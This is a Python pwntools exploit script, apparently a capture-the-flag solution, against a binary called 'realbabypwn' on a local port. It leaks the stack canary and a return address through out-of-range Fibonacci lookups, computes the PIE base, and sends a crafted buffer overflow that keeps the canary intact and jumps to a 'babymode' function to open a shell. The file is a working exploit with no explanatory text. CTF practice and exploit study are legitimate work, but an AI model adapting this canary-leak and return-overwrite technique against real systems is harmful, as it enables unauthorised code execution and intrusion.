from pwn import *

#context.log_level = "debug"

MAIN_RET_OFFSET = 2962
BABYMODE_OFFSET = 2484

def main():
    #p = process("./realbabypwn")
    p = remote("localhost", 1500)

    # Leak the canary
    p.recvuntil("Which fibbonacci offset did you want to look up? ")
    p.sendline("289")
    p.recvuntil("Fibbonaci Number 289: ")
    canary_leak = int(p.recvline())
    log.info("Canary: 0x%x" % canary_leak)

    # Leak the process base of the PIE binary
    p.recvuntil("Want to learn another Fibbonaci number? (y/n)")
    p.sendline("y")
    p.recvuntil("Which fibbonacci offset did you want to look up? ")
    p.sendline("291")
    p.recvuntil("Fibbonaci Number 291: ")
    main_leak = int(p.recvline())
    log.info("Main Leak: 0x%x" % main_leak)
    process_base = main_leak - MAIN_RET_OFFSET

    # Calculate the address of babymode function
    log.info("Process Base: 0x%x" % process_base)
    babymode_addr = process_base + BABYMODE_OFFSET
    log.info("babymode Address: 0x%x" % babymode_addr)
    p.recvuntil("Want to learn another Fibbonaci number? (y/n)")

    # Send the overflow with fixed canary and jump to babymode
    p.sendline("n")
    p.recvuntil("Did you learn anything? ")

    payload  = "A"*264
    payload += p64(canary_leak)
    payload += p64(0xdeadbeef)
    payload += p64(babymode_addr)
    payload  = payload.ljust(0x200, "\x00")

    p.send(payload)

    log.success("Enjoy your shell.")
    p.interactive()

if __name__ == "__main__":
    main()
